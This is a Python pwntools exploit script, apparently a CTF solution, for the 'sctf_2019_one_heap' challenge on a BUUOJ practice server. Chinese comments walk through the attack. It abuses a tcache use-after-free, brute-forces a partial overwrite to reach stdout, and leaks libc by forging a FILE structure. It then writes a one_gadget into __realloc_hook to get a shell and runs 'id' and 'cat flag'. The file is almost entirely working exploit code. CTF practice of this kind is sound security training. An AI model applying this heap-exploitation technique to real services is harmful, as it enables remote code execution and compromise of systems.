# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
#context.log_level = 'debug' 
context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './sctf_2019_one_heap'
elf = ELF(binary)
libc = elf.libc
#libc = ELF('')
context.binary = binary
DEBUG = 0
if DEBUG:
    p = process(binary)
    libc = elf.libc
    #p = process(['qemu-arm', binary])
    #p = process(['qemu-aarch64','-L','',binary])
    #p = process(['qemu-aarch64','-L','',-g,'1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '28284'
    p = remote(host,port)
l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x)[2:] , 16)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    global p
    i = 1
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg("times----->",i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)
            pass

def one_gadget(filename):
    log.progress('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla(':',num)

def add(size,text = "A"+"\n"):
    cmd(1)
    sla("size:",size)
    sa("content:",text)

def delete():
    cmd(2)

one_gad = one_gadget(libc.path)

# 4次 delete 15次 add 之内打一个 uaf 
# 没 show 全开，必然要打 stdout
# 经典双爆破 1 / 256 成功率

def pwn():
    add(0x7f)
    add(0x7f)

    delete()
    delete()

    add(0x7f,"\x10\x40"+"\n")
    # 爆破申请到 tcahce 堆管理块

    add(0x7f)
    payload  = "\x07"*0x40 
    add(0x7f,payload + "\n")
    # 将各个 tcache 数量填到 7
    delete()
    # free 掉进入 unsortedbin
    add(0x28, "\x07"*0x28 )
    add(0x28, "\x00"*0x28 )
    delete()
    # 这里 free 掉一个包含 tcache 链表头的 chunk 为后续攻击做准备
    # 不断申请切割得到与 libc 相近的地址并爆破到 stdout

    add(0x18,p16(0x6760) + "\n")

    payload  = p64(0xfbad1800) + p64(0)
    payload += p64(0)*2
    payload += "\x00"

    add(0x58,payload + "\n")
    # 经典 stdout 泄露

    leak = l64() + 0x38
    if leak == 0x38:
        exit(0)

    libc.address = leak - libc.sym["__free_hook"]
    __malloc_hook = libc.sym["__malloc_hook"]
    realloc_hook = libc.sym["__realloc_hook"]
    realloc = libc.sym["realloc"]
    ogg = one_gad[2] + libc.address

    lg("leak",leak)
    lg("realloc_hook",realloc_hook)

    add(0x28 , p64(0)*2 + p64(realloc_hook)*2 + "\n")
    # 使用先前释放的 chunk 布置 tcache 链表头指针到 __realloc_hook 处

    payload = p64(ogg) + p64(realloc + 0x4)
    add(0x10,payload )
    
    add(0x70)
    try:
        sl("id")
        p.recvline_contains("uid", timeout=2)
        sl("cat flag")
        p.interactive()
    except:
        try:
            p.close()
        except:
            pass

exhaust(pwn )


'''
@File    :   sctf_2019_one_heap.py
@Time    :   2021/08/16 17:02:44
@Author  :   Niyah 
'''